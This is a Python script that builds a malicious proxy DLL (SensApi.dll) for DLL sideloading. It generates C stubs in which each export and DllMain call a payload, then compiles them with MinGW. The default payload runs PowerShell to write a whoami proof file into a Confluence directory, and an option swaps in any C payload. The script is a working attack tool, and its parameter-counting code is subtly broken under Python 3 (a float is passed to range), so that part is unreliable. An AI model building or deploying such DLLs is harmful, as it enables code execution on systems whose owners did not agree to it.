#!/usr/bin/python3

import argparse
import os

build_dir = os.getcwd() + "/build"
def main():
  build_tool = "x86_64-w64-mingw32-gcc"
  parser = argparse.ArgumentParser()

  parser.add_argument("functions_path", metavar="functions", type=str, help="Exported functions from DLL Export Viewer")
  parser.add_argument("--payload_path", metavar="payload", type=str, help="Path to payload c file")
  parser.add_argument("--enable_i686", action='store_true', help="Generate a 32 bit dll")

  args = parser.parse_args()

  if args.enable_i686:
    build_tool = "i686-w64-mingw32-gcc"

  payload = """
  #include <stdio.h>
  #include <windows.h>

  #ifndef DLL_H_
  #define DLL_H_

  #ifdef BUILD_DLL
  /* DLL export */
  #define EXPORT __declspec(dllexport)
  #else
  /* EXE import */
  #define EXPORT __declspec(dllimport)
  #endif
  #endif /* DLL_H_ */


  void payload() {
    system("powershell -command echo DLL sideloading successful as $(whoami) > C:\\\\Confluence\\\\pwned");
  }

  EXPORT BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
          payload();
          break;
    }

    return TRUE;
}
  """

  if args.payload_path != None:
    with open(args.payload_path, "r") as payload_file:
      payload = payload_file.read()
  
  with open(args.functions_path, "r") as input_file:
    lines = input_file.read().strip().split("\n")

    lines = filter(
      lambda x: x.startswith("Function Name"),
      lines
    )

    lines = map(
      lambda x: x.split(": ")[1].strip(),
      lines
    )

    lines = map(
      parse,
      lines
    )

    payload = payload + "\n".join(lines)

  if not os.path.exists(build_dir):
    os.mkdir(build_dir)

  generated_c_name = "main"
  generated_c_path = build_dir + "/%s.c" % generated_c_name
  with open(generated_c_path, "w") as out_file:
    out_file.write(payload)
  
  built_c_path = build_dir + "/%s.o" % generated_c_name
  output_path = build_dir + "/SensApi.dll"
  output_a_path = build_dir + "/SensApi.dll.a"

  os.system("%s -c -DBUILD_DLL %s -o %s" % (build_tool, generated_c_path, built_c_path))
  os.system("%s -shared -o %s %s -Wl,--out-implib,%s" % (build_tool, output_path, built_c_path, output_a_path))

  print("Successfully generated poisoned DLL: " + output_path)

  
def parse(func):
  if "@" in func:
    cnt = int(func.split("@")[1]) / 4
    name = func.split("@")[0].strip()

    param = ""
    for i in range(cnt):
      param += "int a%d" % i
      if i != cnt - 1:
        param += ", "

    return "EXPORT void __stdcall *%s(%s){ payload(); }" % (name, param)
  else:
    return "EXPORT void *%s(){ payload(); }" % func


if __name__ == "__main__":
  main()
